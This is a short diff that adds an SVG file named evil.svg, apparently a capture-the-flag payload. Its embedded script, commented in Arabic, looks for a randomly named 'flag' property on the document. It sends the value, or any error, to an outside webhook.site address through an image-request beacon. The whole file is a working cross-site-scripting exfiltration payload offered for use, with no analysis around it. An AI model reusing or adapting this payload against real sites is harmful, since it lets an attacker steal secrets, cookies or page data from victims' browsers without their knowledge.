@@ -1,0 +1,17 @@
+<!-- evil.svg -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    try {
+      // ابحث عن الخاصية العشوائية document.flag*****
+      const k = Object.getOwnPropertyNames(document).find(n => /^flag[a-z0-9]+$/.test(n));
+      if (k) {
+        // هرّب الفلاغ إلى خادمك
+        new Image().src = 'https://webhook.site/620b04fd-6c7d-4fbd-b3f8-8dc7cc290bf8/leak?d=' + encodeURIComponent(document[k]);
+      } else {
+        new Image().src = 'https://webhook.site/620b04fd-6c7d-4fbd-b3f8-8dc7cc290bf8/leak?err=no_key';
+      }
+    } catch(e) {
+      new Image().src = 'https://webhook.site/620b04fd-6c7d-4fbd-b3f8-8dc7cc290bf8/leak?err=' + encodeURIComponent(e+'');
+    }
+  </script>
+</svg>
